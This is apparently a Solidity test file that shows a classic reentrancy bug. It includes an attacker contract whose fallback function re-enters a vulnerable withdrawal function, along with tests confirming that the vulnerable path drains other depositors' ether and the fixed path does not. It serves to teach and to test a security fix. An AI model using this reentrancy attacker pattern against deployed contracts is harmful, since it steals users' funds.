pragma solidity ^0.4.26;

import "../src/Reentrancy.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract LocalReentryActor {
    Reentrance public target;
    bool public useFixed;
    uint public callbacks;
    constructor(address victim, bool fixedMode) public {
        target = Reentrance(victim);
        useFixed = fixedMode;
    }
    function deposit() public payable {
        target.addToBalance.value(msg.value)();
    }
    function withdraw() public {
        if (useFixed) target.withdrawBalance_fixed();
        else target.withdrawBalance();
    }
    function() external payable {
        if (callbacks < 1 && address(target).balance >= 1 ether) {
            callbacks += 1;
            withdraw();
        }
    }
}

contract HistoricalReentryTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function setup(bool fixedMode) internal returns (Reentrance, LocalReentryActor) {
        vm.deal(address(this), 10 ether);
        Reentrance target = new Reentrance();
        target.addToBalance.value(2 ether)();
        LocalReentryActor actor = new LocalReentryActor(address(target), fixedMode);
        actor.deposit.value(1 ether)();
        return (target, actor);
    }

    function testVulnerablePathDrainsExtraFunds() public {
        Reentrance target;
        LocalReentryActor actor;
        (target, actor) = setup(false);
        actor.withdraw();
        require(address(actor).balance == 2 ether, "expected repeat withdrawal");
        require(address(target).balance == 1 ether, "expected victim funds reduced");
        require(actor.callbacks() == 1, "expected nested callback");
    }

    function testFixedPathPreservesOtherDepositorsFunds() public {
        Reentrance target;
        LocalReentryActor actor;
        (target, actor) = setup(true);
        actor.withdraw();
        require(address(actor).balance == 1 ether, "fixed path paid extra");
        require(address(target).balance == 2 ether, "fixed path lost funds");
    }
}
